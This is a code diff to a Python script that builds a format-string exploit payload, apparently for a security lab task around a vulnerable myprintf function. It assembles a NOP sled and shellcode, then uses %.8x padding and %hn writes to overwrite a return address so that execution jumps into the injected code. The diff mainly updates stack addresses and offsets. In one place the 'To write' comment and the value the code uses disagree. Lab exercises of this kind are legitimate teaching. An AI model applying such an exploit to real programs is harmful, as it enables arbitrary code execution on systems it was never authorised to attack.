@@ -48,8 +48,8 @@ malicious_code = (
 ).encode('latin-1')
 
 
-N = 1500
-INPUT_ARRAY_OFFSET = 1000
+N = 1200
+INPUT_ARRAY_OFFSET = 500
 
 # Fill the content with NOP's
 content = bytearray(0x90 for i in range(N))
@@ -58,34 +58,33 @@ content = bytearray(0x90 for i in range(N))
 start = N - len(malicious_code)
 content[start:] = malicious_code
 
-# The address of the input array: 0xffffcbb0
-# The ebp value inside myprintf() is: 0xffffcb68
+# The address of the input array: 0xffffd0f0
+# The ebp value inside myprintf() is: 0xffffd0a8
 # Return address is 4 bytes above frame pointer
 
-return_address = 0xffffcb6c
-input_array_address = 0xffffcbb0
+return_address = 0xffffd0ac
+input_array_address = 0xffffd0f0
 
 # This will be written to return_address
 target_address_value = input_array_address + INPUT_ARRAY_OFFSET
 
-last_two_bytes = 0xffffcb6e
-first_two_bytes = 0xffffcb6c
+last_two_bytes = 0xffffd0ae
+first_two_bytes = 0xffffd0ac
 
 content[0:4] = last_two_bytes.to_bytes(4, byteorder='little')
-content[4:8] = b"@@@@".encode('latin-1')
+content[4:8] = b"@@@@"
 content[8:12] = first_two_bytes.to_bytes(4, byteorder='little')
 
-# To write: 0xffffcf98
+# To write: 0xffffd4d8
 
 small = 0xffff - 12 - 240
-large = (0x10000 - 0xffff - 1) + 0xcf98
-
+large = (0x10000 - 0xffff - 1) + 0xd2e4
 s = "%.8x" * 30
 s += "%." + str(small) + "x" + "%hn"
 s += "%." + str(large) + "x" + "%hn"
 
 fmt = (s).encode('latin-1')
-content[12:12 + len(fmt)] = fmt
+content[12: 12 + len(fmt)] = fmt
 
 # Write the content to badfile
 file = open("task_6_badfile", "wb")
